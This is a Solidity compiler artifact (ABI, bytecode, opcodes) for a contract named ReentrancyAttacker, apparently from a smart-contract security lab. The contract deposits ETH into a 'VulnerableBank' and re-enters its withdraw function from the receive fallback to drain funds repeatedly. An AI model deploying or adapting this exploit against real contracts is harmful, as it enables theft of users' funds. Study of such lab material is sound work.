{"contracts/reentrancy/ReentrancyAttacker.sol":{"ReentrancyAttacker":{"abi":[{"inputs":[{"internalType":"address","name":"bankAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"attackAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"attackerBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"bank","outputs":[{"internalType":"contract IVulnerableBank","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"loops","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxLoops","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_maxLoops","type":"uint256"}],"name":"setMaxLoops","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"evm":{"bytecode":{"linkReferences":{},"object":"6080604052600a60025534801561001557600080fd5b5060405161079d38038061079d833981810160405281019061003791906100e0565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061010d565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ad82610082565b9050919050565b6100bd816100a2565b81146100c857600080fd5b50565b6000815190506100da816100b4565b92915050565b6000602082840312156100f6576100f561007d565b5b6000610104848285016100cb565b91505092915050565b6106818061011c6000396000f3fe6080604052600436106100745760003560e01c8063881935651161004e57806388193565146101f8578063938b9ceb146102235780639e5faafc1461024e578063f8a921af1461025857610172565b80632b8ed6e5146101775780634213bc8f146101a257806376cdb03b146101cd57610172565b366101725760015460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101580156100c55750600254600354105b1561017057600360008154809291906100dd90610464565b919050555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6001546040518263ffffffff1660e01b815260040161013d91906104bb565b600060405180830381600087803b15801561015757600080fd5b505af115801561016b573d6000803e3d6000fd5b505050505b005b600080fd5b34801561018357600080fd5b5061018c610281565b60405161019991906104bb565b60405180910390f35b3480156101ae57600080fd5b506101b7610289565b6040516101c491906104bb565b60405180910390f35b3480156101d957600080fd5b506101e261028f565b6040516101ef9190610555565b60405180910390f35b34801561020457600080fd5b5061020d6102b3565b60405161021a91906104bb565b60405180910390f35b34801561022f57600080fd5b506102386102b9565b60405161024591906104bb565b60405180910390f35b6102566102bf565b005b34801561026457600080fd5b5061027f600480360381019061027a91906105a1565b610421565b005b600047905090565b60025481565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b60035481565b60003411610302576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102f99061062b565b60405180910390fd5b34600181905550600060038190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561037957600080fd5b505af115801561038d573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6001546040518263ffffffff1660e01b81526004016103ed91906104bb565b600060405180830381600087803b15801561040757600080fd5b505af115801561041b573d6000803e3d6000fd5b50505050565b8060028190555050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b600061046f8261045a565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036104a1576104a061042b565b5b600182019050919050565b6104b58161045a565b82525050565b60006020820190506104d060008301846104ac565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061051b610516610511846104d6565b6104f6565b6104d6565b9050919050565b600061052d82610500565b9050919050565b600061053f82610522565b9050919050565b61054f81610534565b82525050565b600060208201905061056a6000830184610546565b92915050565b600080fd5b61057e8161045a565b811461058957600080fd5b50565b60008135905061059b81610575565b92915050565b6000602082840312156105b7576105b6610570565b5b60006105c58482850161058c565b91505092915050565b600082825260208201905092915050565b7f6e65656420455448000000000000000000000000000000000000000000000000600082015250565b60006106156008836105ce565b9150610620826105df565b602082019050919050565b6000602082019050818103600083015261064481610608565b905091905056fea2646970667358221220ef5505279bb9f81ab8c0e0966d15914b3984969dabdb8d62e90d31a8b0298da864736f6c63430008140033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0xA PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x15 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x79D CODESIZE SUB DUP1 PUSH2 0x79D DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x37 SWAP2 SWAP1 PUSH2 0xE0 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x10D JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xAD DUP3 PUSH2 0x82 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xBD DUP2 PUSH2 0xA2 JUMP JUMPDEST DUP2 EQ PUSH2 0xC8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xDA DUP2 PUSH2 0xB4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF6 JUMPI PUSH2 0xF5 PUSH2 0x7D JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x104 DUP5 DUP3 DUP6 ADD PUSH2 0xCB JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x681 DUP1 PUSH2 0x11C PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x74 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x88193565 GT PUSH2 0x4E JUMPI DUP1 PUSH4 0x88193565 EQ PUSH2 0x1F8 JUMPI DUP1 PUSH4 0x938B9CEB EQ PUSH2 0x223 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x24E JUMPI DUP1 PUSH4 0xF8A921AF EQ PUSH2 0x258 JUMPI PUSH2 0x172 JUMP JUMPDEST DUP1 PUSH4 0x2B8ED6E5 EQ PUSH2 0x177 JUMPI DUP1 PUSH4 0x4213BC8F EQ PUSH2 0x1A2 JUMPI DUP1 PUSH4 0x76CDB03B EQ PUSH2 0x1CD JUMPI PUSH2 0x172 JUMP JUMPDEST CALLDATASIZE PUSH2 0x172 JUMPI PUSH1 0x1 SLOAD PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT ISZERO DUP1 ISZERO PUSH2 0xC5 JUMPI POP PUSH1 0x2 SLOAD PUSH1 0x3 SLOAD LT JUMPDEST ISZERO PUSH2 0x170 JUMPI PUSH1 0x3 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xDD SWAP1 PUSH2 0x464 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x13D SWAP2 SWAP1 PUSH2 0x4BB JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x157 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x16B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x183 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18C PUSH2 0x281 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x199 SWAP2 SWAP1 PUSH2 0x4BB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1AE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B7 PUSH2 0x289 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1C4 SWAP2 SWAP1 PUSH2 0x4BB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1D9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1E2 PUSH2 0x28F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1EF SWAP2 SWAP1 PUSH2 0x555 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x204 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x20D PUSH2 0x2B3 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x21A SWAP2 SWAP1 PUSH2 0x4BB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x22F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x238 PUSH2 0x2B9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x245 SWAP2 SWAP1 PUSH2 0x4BB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x256 PUSH2 0x2BF JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x264 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x27F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x27A SWAP2 SWAP1 PUSH2 0x5A1 JUMP JUMPDEST PUSH2 0x421 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 CALLVALUE GT PUSH2 0x302 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2F9 SWAP1 PUSH2 0x62B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST CALLVALUE PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x3 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x379 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x38D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3ED SWAP2 SWAP1 PUSH2 0x4BB JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x407 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x41B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x46F DUP3 PUSH2 0x45A JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x4A1 JUMPI PUSH2 0x4A0 PUSH2 0x42B JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4B5 DUP2 PUSH2 0x45A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4D0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x4AC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x51B PUSH2 0x516 PUSH2 0x511 DUP5 PUSH2 0x4D6 JUMP JUMPDEST PUSH2 0x4F6 JUMP JUMPDEST PUSH2 0x4D6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x52D DUP3 PUSH2 0x500 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x53F DUP3 PUSH2 0x522 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x54F DUP2 PUSH2 0x534 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x56A PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x546 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x57E DUP2 PUSH2 0x45A JUMP JUMPDEST DUP2 EQ PUSH2 0x589 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x59B DUP2 PUSH2 0x575 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x5B7 JUMPI PUSH2 0x5B6 PUSH2 0x570 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x5C5 DUP5 DUP3 DUP6 ADD PUSH2 0x58C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6E65656420455448000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x615 PUSH1 0x8 DUP4 PUSH2 0x5CE JUMP JUMPDEST SWAP2 POP PUSH2 0x620 DUP3 PUSH2 0x5DF JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x644 DUP2 PUSH2 0x608 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xEF SSTORE SDIV 0x27 SWAP12 0xB9 0xF8 BYTE 0xB8 0xC0 0xE0 SWAP7 PUSH14 0x15914B3984969DABDB8D62E90D31 0xA8 0xB0 0x29 DUP14 0xA8 PUSH5 0x736F6C6343 STOP ADDMOD EQ STOP CALLER "},"methodIdentifiers":{"attack()":"9e5faafc","attackAmount()":"88193565","attackerBalance()":"2b8ed6e5","bank()":"76cdb03b","loops()":"938b9ceb","maxLoops()":"4213bc8f","setMaxLoops(uint256)":"f8a921af"}}}}}